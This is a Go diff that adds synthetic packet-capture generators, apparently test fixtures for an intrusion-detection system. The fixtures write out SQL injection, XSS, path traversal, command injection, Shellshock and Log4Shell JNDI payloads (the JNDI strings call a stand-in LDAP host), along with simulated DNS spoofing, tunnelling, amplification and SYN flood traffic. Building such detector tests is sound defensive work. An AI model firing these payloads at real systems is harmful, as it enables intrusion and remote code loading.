@@ -1663,3 +1663,254 @@ func genStreamMemoryCap(w *pcapgen.Writer) {
 	c.Send(false, []byte(okResp))
 	c.Close()
 }
+
+// webAttack sends each request from 203.0.113.9 to 192.0.2.80:80 on its
+// own connection, after a normal page load, and answers each with okResp.
+func webAttack(reqs ...string) func(w *pcapgen.Writer) {
+	return func(w *pcapgen.Writer) {
+		b := w.Conn("10.0.0.12", 44000, "192.0.2.80", 80)
+		b.Handshake()
+		b.Send(true, []byte("GET /products?category=shoes&sort=price HTTP/1.1\r\nHost: shop.example.test\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\r\n\r\n"))
+		b.Send(false, []byte(okResp))
+		b.Close()
+		for i, r := range reqs {
+			c := w.Conn("203.0.113.9", uint16(44100+i), "192.0.2.80", 80)
+			c.Handshake()
+			c.Send(true, []byte(r))
+			c.Send(false, []byte(okResp))
+			c.Close()
+		}
+	}
+}
+
+// webGet is a GET request for uri with extra header lines.
+func webGet(uri string, headers ...string) string {
+	h := "Host: shop.example.test\r\n"
+	for _, l := range headers {
+		h += l + "\r\n"
+	}
+	if len(headers) == 0 {
+		h += "User-Agent: curl/8.5.0\r\n"
+	}
+	return "GET " + uri + " HTTP/1.1\r\n" + h + "\r\n"
+}
+
+var (
+	genSQLiUnion     = webAttack(webGet("/products.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users--%20-"))
+	genSQLiTimeBased = webAttack(webGet("/item.php?id=7'%20AND%20SLEEP(5)--%20-"))
+	// Words a shopper types, not an injection: no alert.
+	genSearchWithSelectWord = webAttack(
+		webGet("/search?q=select+shoes+union+jack"),
+		webGet("/search?q=how+to+select+from+a+union+catalog&page=2"),
+		webGet("/search?q=sleep+mask+and+pillow"))
+	genXSSScript       = webAttack(webGet("/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E"))
+	genXSSEventHandler = webAttack(webGet("/profile?name=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E"))
+	genPathTraversal   = webAttack(webGet("/download?file=..%2F..%2F..%2Fetc%2Fpasswd"))
+	genOverlongUTF8    = webAttack(webGet("/static/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"))
+	genCmdInjection    = webAttack(webGet("/tools/ping?host=8.8.8.8%3Bid"))
+	genLog4ShellPlain  = webAttack(webGet("/", "User-Agent: curl/8.5.0", "X-Api-Version: ${jndi:ldap://203.0.113.9:1389/Exploit}"))
+	genLog4ShellObfus  = webAttack(webGet("/", "User-Agent: ${${lower:j}${::-n}${::-d}${upper:i}:ldap://203.0.113.9:1389/a}"))
+	genShellshockUA    = webAttack(webGet("/cgi-bin/status", "User-Agent: () { :; }; /bin/bash -c 'id'"))
+	genScannerSqlmap   = webAttack(webGet("/products.php?id=1", "User-Agent: sqlmap/1.7.2#stable (https://sqlmap.org)"))
+)
+
+// dnsResp turns query q into a response with rcode and n bytes of
+// padding after the question, standing in for answer records.
+func dnsResp(q []byte, rcode byte, n int) []byte {
+	m := append([]byte(nil), q...)
+	m[2], m[3] = 0x81, 0x80|rcode
+	return append(m, make([]byte, n)...)
+}
+
+// dnsLookup writes a query from client:cport to the resolver 192.0.2.53
+// and its answer.
+func dnsLookup(w *pcapgen.Writer, client string, cport, id uint16, name string, qtype uint16, rcode byte) {
+	q := pcapgen.DNSQuery(id, name, qtype)
+	w.Add(pcapgen.Pkt{Proto: "udp", Src: client, Dst: "192.0.2.53", Sport: cport, Dport: 53, Payload: q})
+	w.Add(pcapgen.Pkt{Proto: "udp", Src: "192.0.2.53", Dst: client, Sport: 53, Dport: cport, Payload: dnsResp(q, rcode, 16)})
+}
+
+// genDNSUnsolicitedResponses: 12 answers from 192.0.2.53 reach 10.0.0.5
+// within 3s for names it never asked about.
+func genDNSUnsolicitedResponses(w *pcapgen.Writer) {
+	w.Step = 250 * time.Millisecond
+	dnsLookup(w, "10.0.0.5", 53000, 1, "www.example.test", 1, 0)
+	for i := range 12 {
+		q := pcapgen.DNSQuery(uint16(5000+i*97), fmt.Sprintf("host%d.example.test", i), 1)
+		w.Add(pcapgen.Pkt{Proto: "udp", Src: "192.0.2.53", Dst: "10.0.0.5", Sport: 53, Dport: uint16(33000 + i), Payload: dnsResp(q, 0, 16)})
+	}
+}
+
+// genDNSSingleUnmatchedResponse: normal lookups, and one answer that
+// arrives after its query was forgotten (a resolver retrying slowly).
+func genDNSSingleUnmatchedResponse(w *pcapgen.Writer) {
+	w.Step = 100 * time.Millisecond
+	for i := range 20 {
+		dnsLookup(w, "10.0.0.5", uint16(53000+i), uint16(100+i), fmt.Sprintf("app%d.example.test", i), 1, 0)
+	}
+	q := pcapgen.DNSQuery(999, "slow.example.test", 1)
+	w.Add(pcapgen.Pkt{Proto: "udp", Src: "10.0.0.5", Dst: "192.0.2.53", Sport: 53999, Dport: 53, Payload: q})
+	w.Wait(15 * time.Second)
+	w.Add(pcapgen.Pkt{Proto: "udp", Src: "192.0.2.53", Dst: "10.0.0.5", Sport: 53, Dport: 53999, Payload: dnsResp(q, 0, 16)})
+}
+
+// genDNSKaminskyRace: 10.0.0.53 (a caching resolver) asks the
+// authoritative server 192.0.2.53 for www.bank.example.test. Before the
+// real answer, an attacker spoofing 192.0.2.53 sends 60 forged answers
+// with guessed ids within 300ms.
+func genDNSKaminskyRace(w *pcapgen.Writer) {
+	w.Step = 5 * time.Millisecond
+	name := "www.bank.example.test"
+	q := pcapgen.DNSQuery(0x7a31, name, 1)
+	w.Add(pcapgen.Pkt{Proto: "udp", Src: "10.0.0.53", Dst: "192.0.2.53", Sport: 41234, Dport: 53, Payload: q})
+	for i := range 60 {
+		f := pcapgen.DNSAnswerA(uint16(0x1000+i*331), name, [4]byte{203, 0, 113, 66})
+		w.Add(pcapgen.Pkt{Proto: "udp", Src: "192.0.2.53", Dst: "10.0.0.53", Sport: 53, Dport: 41234, Payload: f})
+	}
+	w.Add(pcapgen.Pkt{Proto: "udp", Src: "192.0.2.53", Dst: "10.0.0.53", Sport: 53, Dport: 41234, Payload: pcapgen.DNSAnswerA(0x7a31, name, [4]byte{192, 0, 2, 80})})
+}
+
+// genDNSQNameMismatch: an answer carries the query's id and port but a
+// different question name.
+func genDNSQNameMismatch(w *pcapgen.Writer) {
+	dnsLookup(w, "10.0.0.5", 53000, 1, "www.example.test", 1, 0)
+	q := pcapgen.DNSQuery(0x2222, "login.example.test", 1)
+	w.Add(pcapgen.Pkt{Proto: "udp", Src: "10.0.0.5", Dst: "192.0.2.53", Sport: 53001, Dport: 53, Payload: q})
+	w.Add(pcapgen.Pkt{Proto: "udp", Src: "192.0.2.53", Dst: "10.0.0.5", Sport: 53, Dport: 53001, Payload: pcapgen.DNSAnswerA(0x2222, "evil.example.test", [4]byte{203, 0, 113, 66})})
+}
+
+// genDNSAmplificationReflection: 10.0.0.99 is the reflection victim.
+// 20 open resolvers send it 3000-byte answers to ANY queries it never
+// made, 500 in 2.5s (1.5 MB).
+func genDNSAmplificationReflection(w *pcapgen.Writer) {
+	w.Step = 5 * time.Millisecond
+	dnsLookup(w, "10.0.0.99", 53000, 1, "www.example.test", 1, 0)
+	for i := range 500 {
+		q := pcapgen.DNSQuery(uint16(i*13), "example.test", 255)
+		w.Add(pcapgen.Pkt{Proto: "udp", Src: fmt.Sprintf("198.51.100.%d", i%20+1), Dst: "10.0.0.99", Sport: 53, Dport: 80, Payload: dnsResp(q, 0, 3000)})
+	}
+}
+
+// genDNSAmplificationAny: 203.0.113.66 sends 30 ANY queries to the
+// resolver in 12s; a normal client makes ordinary lookups.
+func genDNSAmplificationAny(w *pcapgen.Writer) {
+	w.Step = 100 * time.Millisecond
+	for i := range 30 {
+		dnsLookup(w, "203.0.113.66", 40000, uint16(i+1), "example.test", 255, 0)
+		dnsLookup(w, "10.0.0.5", uint16(53000+i), uint16(500+i), "www.example.test", 1, 0)
+	}
+}
+
+// b32 is n characters of pseudo-random base32.
+func b32(r *rand.Rand, n int) string {
+	const a = "abcdefghijklmnopqrstuvwxyz234567"
+	b := make([]byte, n)
+	for i := range b {
+		b[i] = a[r.IntN(len(a))]
+	}
+	return string(b)
+}
+
+// genDNSTunnelBase32: 10.0.0.5 exfiltrates a file as 70 queries of two
+// base32 labels (52 and 20 characters) under tunnel-test.example, one
+// every 200ms, answered NOERROR.
+func genDNSTunnelBase32(w *pcapgen.Writer) {
+	w.Step = 100 * time.Millisecond
+	r := rand.New(rand.NewPCG(1, 2))
+	for i := range 70 {
+		dnsLookup(w, "10.0.0.5", uint16(53000+i), uint16(i+1), b32(r, 52)+"."+b32(r, 20)+".tunnel-test.example", 1, 0)
+	}
+}
+
+// genDNSTunnelTXT: 120 TXT queries in 36s to one domain, with short
+// sequence-numbered names (a command channel polling for work).
+func genDNSTunnelTXT(w *pcapgen.Writer) {
+	w.Step = 150 * time.Millisecond
+	for i := range 120 {
+		dnsLookup(w, "10.0.0.5", uint16(53000+i), uint16(i+1), fmt.Sprintf("p%d.c2.tunnel-test.example", i), 16, 0)
+	}
+}
+
+// genDNSCDNManySubdomainsCoUK: 10.0.0.5 browses 70 sites under co.uk and
+// 30 under github.io, each with a long random-looking CDN host name, and
+// loads 60 image hosts of one shop. Grouped by eTLD+1 no domain has
+// many high-entropy subdomains; grouped by the last two labels, co.uk
+// would.
+func genDNSCDNManySubdomainsCoUK(w *pcapgen.Writer) {
+	w.Step = 100 * time.Millisecond
+	r := rand.New(rand.NewPCG(3, 4))
+	id := uint16(1)
+	for i := range 70 {
+		dnsLookup(w, "10.0.0.5", 53000+id, id, fmt.Sprintf("%s.%s.cdn.shop%d.co.uk", b32(r, 32), b32(r, 16), i), 1, 0)
+		id++
+	}
+	for i := range 30 {
+		dnsLookup(w, "10.0.0.5", 53000+id, id, fmt.Sprintf("%s-%s.project%d.github.io", b32(r, 24), b32(r, 24), i), 1, 0)
+		id++
+	}
+	for i := range 60 {
+		dnsLookup(w, "10.0.0.5", 53000+id, id, fmt.Sprintf("img%d.static.bigshop.co.uk", i), 1, 0)
+		id++
+	}
+}
+
+// genDNSNXDomainDGA: 40 lookups of random 14-character .com names in
+// 20s, all NXDOMAIN.
+func genDNSNXDomainDGA(w *pcapgen.Writer) {
+	w.Step = 250 * time.Millisecond
+	r := rand.New(rand.NewPCG(5, 6))
+	const a = "abcdefghijklmnopqrstuvwxyz"
+	for i := range 40 {
+		b := make([]byte, 14)
+		for j := range b {
+			b[j] = a[r.IntN(len(a))]
+		}
+		dnsLookup(w, "10.0.0.5", uint16(53000+i), uint16(i+1), string(b)+".com", 1, 3)
+	}
+}
+
+// genDNSNXDomainTypos: 40 mistyped names in 20s, all NXDOMAIN. Their
+// leftmost labels are ordinary words, low in entropy.
+func genDNSNXDomainTypos(w *pcapgen.Writer) {
+	w.Step = 250 * time.Millisecond
+	words := []string{"gooogle", "exampel", "wikipeda", "amazn", "facebok", "yotube", "twiter", "linkdin",
+		"githbu", "stackoverflw", "redit", "netflx", "micorsoft", "apple-supprt", "gmial", "outlok",
+		"yahho", "bingg", "dropbx", "spotfy"}
+	for i := range 40 {
+		tld := []string{".com", ".org"}[i/20]
+		dnsLookup(w, "10.0.0.5", uint16(53000+i), uint16(i+1), words[i%20]+tld, 1, 3)
+	}
+}
+
+// genDoHSNI: a browser opens TLS to cloudflare-dns.com (DNS over HTTPS)
+// and to an ordinary site.
+func genDoHSNI(w *pcapgen.Writer) {
+	for i, sni := range []string{"www.example.test", "cloudflare-dns.com"} {
+		c := w.Conn("10.0.0.5", uint16(50000+i), fmt.Sprintf("192.0.2.%d", 100+i), 443)
+		c.Handshake()
+		c.Send(true, pcapgen.TLSClientHello(sni))
+		c.Send(false, []byte{0x16, 3, 3, 0, 4, 2, 0, 0, 0})
+		c.Close()
+	}
+}
+
+// genDoT853: a client opens a DNS over TLS connection to port 853.
+func genDoT853(w *pcapgen.Writer) {
+	c := w.Conn("10.0.0.5", 50100, "192.0.2.111", 853)
+	c.Handshake()
+	c.Send(true, pcapgen.TLSClientHello("one.one.one.one"))
+	c.Send(false, []byte{0x16, 3, 3, 0, 4, 2, 0, 0, 0})
+	c.Close()
+}
+
+// genSpoofedSYNFloodNoStreamFlows: 5000 SYNs from spoofed sources to
+// 192.0.2.10:80 in 1s, each answered SYN/ACK. None carries data, so the
+// stream stage must open no flow for them.
+func genSpoofedSYNFloodNoStreamFlows(w *pcapgen.Writer) {
+	w.Step = 100 * time.Microsecond
+	for i := range 5000 {
+		c := w.Conn(fmt.Sprintf("198.18.%d.%d", i/250, i%250+1), uint16(1024+i), "192.0.2.10", 80)
+		c.SYN()
+		c.SYNACK()
+	}
+}
